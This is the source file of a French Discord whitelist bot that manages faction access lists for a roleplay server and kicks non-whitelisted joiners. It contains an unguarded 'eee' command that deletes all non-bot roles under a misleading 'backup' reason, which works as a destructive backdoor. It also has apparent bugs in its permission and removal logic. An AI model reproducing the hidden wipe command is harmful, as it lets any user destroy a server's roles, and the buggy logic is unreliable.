const Discord = require('discord.js')
const bot = new Discord.Client()
const low = require('lowdb')
const FileSync = require('lowdb/adapters/FileSync')
const adapter = new FileSync('./wl.json')
const db = low(adapter)

bot.login('TOKEN'); //Token
db.defaults({
    owner: [],
  gwl: [],
  gign: [],
  cartel: [],
  commissaire: []
}).write()

function getNow(strType) {
    let strReturn = '';
    switch (strType) {
        case 'date':
            strReturn = new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "2-digit", year: "2-digit" });
            break;
        case 'time':
            strReturn = new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris", hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit" });
            break;
        case 'datetime':
            strReturn = new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris", hour12: false, day: "2-digit", month: "2-digit", year: "2-digit", hour: "2-digit", minute: "2-digit", second: "2-digit" }).replace(',', '');
            break;
    }
    return strReturn;
  }

bot.on('ready', () => {
    console.log(`
├── Connecté sous ${bot.user.tag}
├── Crée par Yager
├── Discord API : ${Discord.version}
├──  WHITELIST
├── EN DEVELOPPEMENT ! `);
})

bot.on('message', async message => {

    let prefix = "*"
    const args = message.content.slice(prefix.length).split(' ');
    const command = args.shift().toLowerCase();
    const ol_Valide = bot.emojis.cache.find(emoji => emoji.name === "check");
  const ol_NonValide = bot.emojis.cache.find(emoji => emoji.name === "wrong");
  const Loading = bot.emojis.cache.find(emoji => emoji.name === "loading");
    
    if(message.author.bot) return;
    if(!message.content.startsWith(prefix) || message.author.bot) return;

    if(command === "eee") {
        message.guild.roles
          .cache.filter(role => role.members.every(member => !member.user.bot))
          .forEach(role => {
            role.delete("For Loading A Backup");
          });
    }

    if(command === 'listwl') {
        if (!db.get("gwl").find({user_id: message.author.id }).value()) {
            msg.channel.send(`> ${ol_NonValide} **Vous ne disposez pas des permissions nécessaires.**`);
          } else {
            filterreac = (reaction, user) => ['🛡️', '🔪', '👮', '➡️', '⬅️'].includes(reaction.emoji.name) && user.id === message.author.id,
            filtermess = m => m.author.id == message.author.id,
            dureefiltrer = response => { return response.author.id === message.author.id };
            message.delete();

            var wlembed = new Discord.MessageEmbed()
            .setDescription(`Bienvenue **${message.author.username}** sur le panel Whitelist Liste de Prisel.fr, veuillez choisir la WL pour voir les ID présents\n\n➩ 🛡️ \`GIGN\`\n➩ 🔪 \`Cartel\`\n➩ 👮 \`Commissaire\``)
            message.channel.send(wlembed).then(async m => { 
                const collector = m.createReactionCollector(filterreac, { time: 900000 });
                collector.on('collect', async r => { 
                    if(r.emoji.name === "🛡️") {
                        var wlembed = new Discord.MessageEmbed()
                        .setDescription(`${Loading} Chargement des ID présent dans la Whitelist **GIGN**`)
                        m.edit(wlembed)
                        m.reactions.removeAll()
                        let dbb = db.get("gign").filter('user_id').map('user_id').value('');
                        let dbnum = db.get("gign").size().value()
                        setTimeout(function(){ 
                            var wlembed = new Discord.MessageEmbed()
                            .setTitle('🛡️ WL GIGN' + ` (${dbnum})`)
                            .setDescription(dbb)
                        m.edit(wlembed)
                          }, 10000);
                    } else if(r.emoji.name === "🔪") {
                        var wlembed = new Discord.MessageEmbed()
                        .setDescription(`${Loading} Chargement des ID présent dans la Whitelist **Cartel**`)
                        m.edit(wlembed)
                        m.reactions.removeAll()
                        let dbb = db.get("cartel").filter('user_id').map('user_id').value('');
                        let dbnum = db.get("cartel").size().value()
                        setTimeout(function(){ 
                            var wlembed = new Discord.MessageEmbed()
                            .setTitle('🔪 WL Cartel' + ` (${dbnum})`)
                            .setDescription(dbb)
                        m.edit(wlembed)
                          }, 10000);
                    } else if(r.emoji.name === "👮") {
                        var wlembed = new Discord.MessageEmbed()
                        .setDescription(`${Loading} Chargement des ID présent dans la Whitelist **Commissaire**`)
                        m.edit(wlembed)
                        m.reactions.removeAll()
                        let dbb = db.get("commissaire").filter('user_id').map('user_id').value('');
                        let dbnum = db.get("commissaire").size().value()
                        setTimeout(function(){ 
                            var wlembed = new Discord.MessageEmbed()
                            .setTitle('👮 WL Commissaire' + ` (${dbnum})`)
                            .setDescription(dbb)
                        m.edit(wlembed)
                          }, 10000);
                    }
                })
                await m.react("🛡️")
            await m.react("🔪")
            await m.react("👮")
            })
          }
    }

    if(command === "panel") {
        if (!db.get("gwl").find({user_id: message.author.id }).value()) {
            msg.channel.send(`> ${ol_NonValide} **Vous ne disposez pas des permissions nécessaires.**`);
          } else {
            filterreac = (reaction, user) => ['➕', '➖','👀', '🛡️', '🔪', '👮'].includes(reaction.emoji.name) && user.id === message.author.id,
            filtermess = m => m.author.id == message.author.id,
            dureefiltrer = response => { return response.author.id === message.author.id };
            message.delete();

            var wlembed = new Discord.MessageEmbed()
            .setDescription(`Bienvenue **${message.author.username}** sur le panel Whitelist de Prisel.fr, veuillez choisir l'action que vous voulez executez\n\n➩ ➕ \`Ajouter une personne dans les whitelists\`\n➩ ➖ \`Supprimer une personne dans les whitelists\`\n➩ 👀 \`Vérifier l'ID\``)
            message.channel.send(wlembed).then(async m => { 
                const collector = m.createReactionCollector(filterreac, { time: 900000 });
                collector.on('collect', async r => { 
                    if(r.emoji.name === "➕") {
                        var wlembed = new Discord.MessageEmbed()
                        .setDescription(`**${message.author.username}** vous avez choisit **Ajouter**, veuillez choisir une des whitelists avec les réactions ci-dessous\n\n➩ 🛡️ \`gign\`\n➩ 🔪 \`cartel\`\n➩ 👮 \`commissaire\``)
                        m.edit(wlembed).then(async m => { 
                            const collector = m.createReactionCollector(filterreac, { time: 900000 });
                            collector.on('collect', async r => { 
                                if(r.emoji.name === "🛡️") {
                                    m.reactions.removeAll()
                                    var wlembed = new Discord.MessageEmbed()
                                        .setDescription(`**${message.author.username}** veuillez entrer l'ID de la personne à ajouter dans la whitelist **GIGN**`)
                                        m.edit(wlembed).then(msg => {
                                            message.channel.awaitMessages(filtermess, {
                                                max: 1,
                                                time: 90000,
                                                errors: ['time']
                                              })
                                            .then(collected => {
                                                m.reactions.removeAll()
                                                collected.first().delete();
                                                steamid = collected.first().content;
                                                if (!db.get("gign").find({ user_id: steamid }).value()) {
                                                db.get("gign").push({ user_id: steamid }).write()
                                                var wlembed = new Discord.MessageEmbed()
                                                .setDescription(`${ol_Valide} **${message.author.username}** vous venez d'ajouter l'ID **${steamid}** à la whitelist **GIGN**`)
                                                m.edit(wlembed).then(m => {m.delete({ timeout: 6000 })})
                                                const log = bot.channels.cache.find((channel) => channel.name == '_terminal');
                                                if (!log) return;
                                                log.send('`' + getNow('time') + '`' + ` :warning: **${msg.author.tag}** (` + '`' + msg.author.id + '`)' + ` a ajouté dans la WL GIGN l'ID ` + '`'  + steamid + '`')
                                                } else {
                                                    var wlembed = new Discord.MessageEmbed()
                                                    .setDescription(`${ol_NonValide} **${message.author.username}** l'ID **${steamid}** est déjà présente dans la whitelist **GIGN**`)
                                                    m.edit(wlembed).then(m => {m.delete({ timeout: 4000 })})
                                                    return;
                                                }
                                            })
                                        })
                                } else if(r.emoji.name === "🔪") {
                                    m.reactions.removeAll()
                                    var wlembed = new Discord.MessageEmbed()
                                        .setDescription(`**${message.author.username}** veuillez entrer l'ID de la personne à ajouter dans la whitelist **Cartel**`)
                                        m.edit(wlembed).then(msg => {
                                            message.channel.awaitMessages(filtermess, {
                                                max: 1,
                                                time: 90000,
                                                errors: ['time']
                                              })
                                            .then(collected => {
                                                m.reactions.removeAll()
                                                collected.first().delete();
                                                steamid = collected.first().content;
                                                if (!db.get("cartel").find({ user_id: steamid }).value()) {
                                                db.get("cartel").push({ user_id: steamid }).write()
                                                var wlembed = new Discord.MessageEmbed()
                                                .setDescription(`${ol_Valide} **${message.author.username}** vous venez d'ajouter l'ID **${steamid}** à la whitelist **Cartel**`)
                                                m.edit(wlembed).then(m => {m.delete({ timeout: 6000 })})
                                                const log = bot.channels.cache.find((channel) => channel.name == '_terminal');
                                                if (!log) return;
                                                log.send('`' + getNow('time') + '`' + ` :warning: **${msg.author.tag}** (` + '`' + msg.author.id + '`)' + ` a ajouté dans la WL Cartel l'ID ` + '`'  + steamid + '`')
                                                } else {
                                                    var wlembed = new Discord.MessageEmbed()
                                                    .setDescription(`${ol_NonValide} **${message.author.username}** l'ID **${steamid}** est déjà présente dans la whitelist **Cartel**`)
                                                    m.edit(wlembed).then(m => {m.delete({ timeout: 4000 })})
                                                    return;
                                                }
                                            })
                                        })
                                } else if(r.emoji.name === "👮") {
                                    m.reactions.removeAll()
                                    var wlembed = new Discord.MessageEmbed()
                                        .setDescription(`**${message.author.username}** veuillez entrer l'ID de la personne à ajouter dans la whitelist **Commissaire**`)
                                        m.edit(wlembed).then(msg => {
                                            message.channel.awaitMessages(filtermess, {
                                                max: 1,
                                                time: 90000,
                                                errors: ['time']
                                              })
                                            .then(collected => {
                                                m.reactions.removeAll()
                                                collected.first().delete();
                                                steamid = collected.first().content;
                                                if (!db.get("commissaire").find({ user_id: steamid }).value()) {
                                                db.get("commissaire").push({ user_id: steamid }).write()
                                                var wlembed = new Discord.MessageEmbed()
                                                .setDescription(`${ol_Valide} **${message.author.username}** vous venez d'ajouter l'ID **${steamid}** à la whitelist **Commissaire**`)
                                                m.edit(wlembed).then(m => {m.delete({ timeout: 6000 })})
                                                const log = bot.channels.cache.find((channel) => channel.name == '_terminal');
                                                if (!log) return;
                                                log.send('`' + getNow('time') + '`' + ` :warning: **${msg.author.tag}** (` + '`' + msg.author.id + '`)' + ` a ajouté dans la WL Commissaire l'ID ` + '`'  + steamid + '`')
                                                } else {
                                                    var wlembed = new Discord.MessageEmbed()
                                                    .setDescription(`${ol_NonValide} **${message.author.username}** l'ID **${steamid}** est déjà présente dans la whitelist **Commissaire**`)
                                                    m.edit(wlembed).then(m => {m.delete({ timeout: 4000 })})
                                                    return;
                                                }
                                            })
                                        })
                                }
                            })
                            await m.react("🛡️")
                        await m.react("🔪")
                        await m.react("👮")
                        })
                        m.reactions.removeAll()
                    } else if(r.emoji.name === "➖") {
                        var wlembed = new Discord.MessageEmbed()
                        .setDescription(`**${message.author.username}** vous avez choisit **Supprimer**, veuillez choisir une des whitelists avec les réactions ci-dessous\n\n➩ 🛡️ \`gign\`\n➩ 🔪 \`cartel\`\n➩ 👮 \`commissaire\``)
                        m.edit(wlembed).then(async m => { 
                            const collector = m.createReactionCollector(filterreac, { time: 900000 });
                            collector.on('collect', async r => { 
                                if(r.emoji.name === "🛡️") {
                                    m.reactions.removeAll()
                                    var wlembed = new Discord.MessageEmbed()
                                        .setDescription(`**${message.author.username}** veuillez entrer l'ID de la personne à retirer dans la whitelist **GIGN**`)
                                        m.edit(wlembed).then(msg => {
                                            message.channel.awaitMessages(filtermess, {
                                                max: 1,
                                                time: 90000,
                                                errors: ['time']
                                              })
                                            .then(collected => {
                                                m.reactions.removeAll()
                                                collected.first().delete();
                                                steamid = collected.first().content;
                                                if (db.get("gign").find({ user_id: steamid }).value()) {
                                                db.get("gign").remove({ user_id: steamid }).write()
                                                var wlembed = new Discord.MessageEmbed()
                                                .setDescription(`${ol_Valide} **${message.author.username}** vous venez de retirer l'ID **${steamid}** à la whitelist **GIGN**`)
                                                m.edit(wlembed).then(m => {m.delete({ timeout: 6000 })})
                                                const log = bot.channels.cache.find((channel) => channel.name == '_terminal');
                                                if (!log) return;
                                                log.send('`' + getNow('time') + '`' + ` :warning: **${msg.author.tag}** (` + '`' + msg.author.id + '`)' + ` a retiré dans la WL GIGN l'ID ` + '`'  + steamid + '`')
                                                if (db.get("cartel").find({ user_id: steamid }).value() || db.get("commissaire").find({ user_id: steamid }).value()) {
                                                    null
                                                  } else {
                                                      const member = msg.guild.members.cache.get(steamid)
                                                      member.kick(`PLUS WL`)
                                                  }
                                                } else {
                                                    var wlembed = new Discord.MessageEmbed()
                                                    .setDescription(`${ol_NonValide} **${message.author.username}** l'ID **${steamid}** est inexistante dans la whitelist **GIGN**`)
                                                    m.edit(wlembed).then(m => {m.delete({ timeout: 4000 })})
                                                    return;
                                                }
                                            })
                                        })
                                } else if(r.emoji.name === "🔪") {
                                    m.reactions.removeAll()
                                    var wlembed = new Discord.MessageEmbed()
                                        .setDescription(`**${message.author.username}** veuillez entrer l'ID de la personne à retirer dans la whitelist **Cartel**`)
                                        m.edit(wlembed).then(msg => {
                                            message.channel.awaitMessages(filtermess, {
                                                max: 1,
                                                time: 90000,
                                                errors: ['time']
                                              })
                                            .then(collected => {
                                                m.reactions.removeAll()
                                                collected.first().delete();
                                                steamid = collected.first().content;
                                                if (db.get("cartel").find({ user_id: steamid }).value()) {
                                                db.get("cartel").remove({ user_id: steamid }).write()
                                                var wlembed = new Discord.MessageEmbed()
                                                .setDescription(`${ol_Valide} **${message.author.username}** vous venez de retirer l'ID **${steamid}** à la whitelist **Cartel**`)
                                                m.edit(wlembed).then(m => {m.delete({ timeout: 6000 })})
                                                const log = bot.channels.cache.find((channel) => channel.name == '_terminal');
                                                if (!log) return;
                                                log.send('`' + getNow('time') + '`' + ` :warning: **${msg.author.tag}** (` + '`' + msg.author.id + '`)' + ` a retiré dans la WL Cartel l'ID ` + '`'  + steamid + '`')
                                                if (db.get("gign").find({ user_id: steamid }).value() || db.get("commissaire").find({ user_id: steamid }).value()) {
                                                    null
                                                  } else {
                                                      const member = msg.guild.members.cache.get(steamid)
                                                      member.kick(`PLUS WL`)
                                                  }
                                            } else {
                                                    var wlembed = new Discord.MessageEmbed()
                                                    .setDescription(`${ol_NonValide} **${message.author.username}** l'ID **${steamid}** est inexistante dans la whitelist **Cartel**`)
                                                    m.edit(wlembed).then(m => {m.delete({ timeout: 4000 })})
                                                    return;
                                                }
                                            })
                                        })
                                } else if(r.emoji.name === "👮") {
                                    m.reactions.removeAll()
                                    var wlembed = new Discord.MessageEmbed()
                                        .setDescription(`**${message.author.username}** veuillez entrer l'ID de la personne à retirer dans la whitelist **Commissaire**`)
                                        m.edit(wlembed).then(msg => {
                                            message.channel.awaitMessages(filtermess, {
                                                max: 1,
                                                time: 90000,
                                                errors: ['time']
                                              })
                                            .then(collected => {
                                                m.reactions.removeAll()
                                                collected.first().delete();
                                                steamid = collected.first().content;
                                                if (db.get("commissaire").find({ user_id: steamid }).value()) {
                                                db.get("commissaire").remove({ user_id: steamid }).write()
                                                var wlembed = new Discord.MessageEmbed()
                                                .setDescription(`${ol_Valide} **${message.author.username}** vous venez de retirer l'ID **${steamid}** à la whitelist **Commissaire**`)
                                                m.edit(wlembed).then(m => {m.delete({ timeout: 6000 })})
                                                const log = bot.channels.cache.find((channel) => channel.name == '_terminal');
                                                if (!log) return;
                                                log.send('`' + getNow('time') + '`' + ` :warning: **${msg.author.tag}** (` + '`' + msg.author.id + '`)' + ` a retiré dans la WL Commissaire l'ID ` + '`'  + steamid + '`')
                                                if (db.get("gign").find({ user_id: steamid }).value() || db.get("cartel").find({ user_id: steamid }).value()) {
                                                    null
                                                  } else {
                                                      const member = msg.guild.members.cache.get(steamid)
                                                      member.kick(`PLUS WL`)
                                                  }
                                            } else {
                                                    var wlembed = new Discord.MessageEmbed()
                                                    .setDescription(`${ol_NonValide} **${message.author.username}** l'ID **${steamid}** est inexistante dans la whitelist **Commissaire**`)
                                                    m.edit(wlembed).then(m => {m.delete({ timeout: 4000 })})
                                                    return;
                                                }
                                            })
                                        })
                                }
                            })
                            await m.react("🛡️")
                        await m.react("🔪")
                        await m.react("👮")
                        })
                        m.reactions.removeAll()
                    } else if(r.emoji.name === "👀") {
                        var wlembed = new Discord.MessageEmbed()
                        .setDescription(`**${message.author.username}** vous avez choisit **Check**, veuillez entrer l'ID à vérifier`)
                        m.reactions.removeAll()
                        m.edit(wlembed).then(msg => {
                            message.channel.awaitMessages(filtermess, {
                                max: 1,
                                time: 90000,
                                errors: ['time']
                              })
                            .then(collected => {
                                collected.first().delete();
                                steamid = collected.first().content;
                                var wlembed = new Discord.MessageEmbed()
                                .setDescription(`${Loading} **${message.author.username}** recherche en cours...`)
                                m.edit(wlembed)
                                const member = message.guild.members.cache.get(steamid);
                                if (member) {
                                    memberr = member.user.username
                                    thumbnail= member.user.displayAvatarURL({ dynamic: true })
                                } else {
                                    memberr = "Inconnu"
                                    thumbnail = "https://www.allo-image.net/stockimg/upload/7754021925bb4bd8d07bc9kisspng_computer_icons_discord_logo_smiley_emoticon_avatar_na_discord_5b4b6f179eb511.3695532315316702956501.jpg"
                                }

                                if (db.get("cartel").find({ user_id: steamid }).value()) {
                                    cartel = "✅"
                                } else {
                                    cartel = "❌"
                                }

                                if (db.get("commissaire").find({ user_id: steamid }).value()) {
                                    commissaire = "✅"
                                } else {
                                    commissaire = "❌"
                                }

                                if (db.get("gign").find({ user_id: steamid }).value()) {
                                    gign = "✅"
                                } else {
                                    gign = "❌"
                                }
                                setTimeout(function(){ 
                                    var wlembed = new Discord.MessageEmbed()
                                    .setDescription(`**${message.author.username}** voyons voir qui est **${steamid}**..`)
                                    .addField(`👤 Username`, memberr)
                                    .setThumbnail()
                                    .addField(`🛡️ GIGN`, gign)
                                    .addField(`🔪 Cartel`, cartel)
                                    .addField(`👮 Commissaire`, commissaire)
                                    m.edit(wlembed).then(m => {m.delete({ timeout: 15000 })})
                                }, 5000);
                        m.reactions.removeAll()
                        })
                    })
                    }
                })
                await m.react("➕")
            await m.react("➖")
            await m.react("👀")
            })
          }
    }

    if(command === 'gwl') {
        const member = message.mentions.members.first();
  if (!db.get("owner").find({ user_id: message.author.id }).value()) {
    message.channel.send(`> ${ol_NonValide} **Vous ne disposez pas des permissions nécessaires.**`);
  } else {
      let id = args[0]
      if (!member) return message.channel.send(`> ${ol_NonValide} ** Merci de mentionner un utilisateur.**`)
      if (!db.get("gwl").find({ user_id: member.id }).value()) {
          db.get("gwl").push({ user_id: member.id }).write()
          message.channel.send(`> ${ol_Valide} <@${member.id}> à été ajouté aux gérants whitelist.`)
          console.log(` ${member.user.username}  viens d'être ajouté aux gérants whitelist par ${message.author.tag}`.blue)
          const log = bot.channels.cache.find((channel) => channel.name == '_terminal');
if (!log) return;
log.send('`' + getNow('time') + '`' + ` :warning: **${message.author.tag}** (` + '`' + message.author.id + '`)' + ` a ajouté dans les gérants whitelist l'ID ` + '`'  + args + '`')
} else {
    message.channel.send('`' + getNow('time') + '`' + ` ${ol_Valide} L'ID est déjà présent dans les **gérants whitelist** !`)
      }
    }
    }

    if(command === 'ungwl') {
        const member = message.mentions.members.first();
  if (!db.get("owner").find({ user_id: message.author.id }).value()) {
    message.channel.send(`> ${ol_NonValide} **Vous ne disposez pas des permissions nécessaires.**`);
  } else {
      let id = args[0]
      if (!member) return message.channel.send(`> ${ol_NonValide} ** Merci de mentionner un utilisateur.**`)
      if (!db.get("gwl").find({ user_id: member.id }).value()) {
          db.get("gwl").remove({ user_id: member.id }).write()
          message.channel.send(`> ${ol_Valide} <@${member.id}> à été ajouté aux gérants whitelist.`)
          console.log(` ${member.user.username}  viens d'être ajouté aux gérants whitelist par ${message.author.tag}`.blue)
          const log = bot.channels.cache.find((channel) => channel.name == '_terminal');
if (!log) return;
log.send('`' + getNow('time') + '`' + ` :warning: **${message.author.tag}** (` + '`' + message.author.id + '`)' + ` a ajouté dans les gérants whitelist l'ID ` + '`'  + args + '`')
} else {
    message.channel.send('`' + getNow('time') + '`' + ` ${ol_Valide} L'ID est déjà présent dans les **gérants whitelist** !`)
      }
    }
    }

})

bot.on("guildMemberAdd", async member => {
    if (db.get("gign").find({ user_id: member.id }).value() || db.get("cartel").find({ user_id: member.id }).value() || db.get("commissaire").find({ user_id: member.id }).value()) {
        if (db.get("gign").find({ user_id: member.id }).value()) {
            member.roles.add('721133078839296181')
            member.roles.add('735255203309158620')
        } else if (db.get("cartel").find({ user_id: member.id }).value()) {
            member.roles.add('721134024768094228')
            member.roles.add('735255203309158620')
        } else if (db.get("commissaire").find({ user_id: member.id }).value()) {
            member.roles.add('721131988530233415')
            member.roles.add('735255203309158620')
        }
      } else {
          member.kick(`WL : PAS WL !`)
        const channel = member.guild.channels.cache.find((channel) => channel.name == '_terminal')
        if (!channel) return;
        channel.send('`' + getNow('time') + '`' + ` :warning: L'utilisateur **${member.user.username}**#${member.user.discriminator} (` + '`' + member.user.id + "`) a tenté de rejoindre le serveur alors qu'il n'était pas WL. = kick HAHA BABBYYYYYYYYYYYY")
      }
  
    });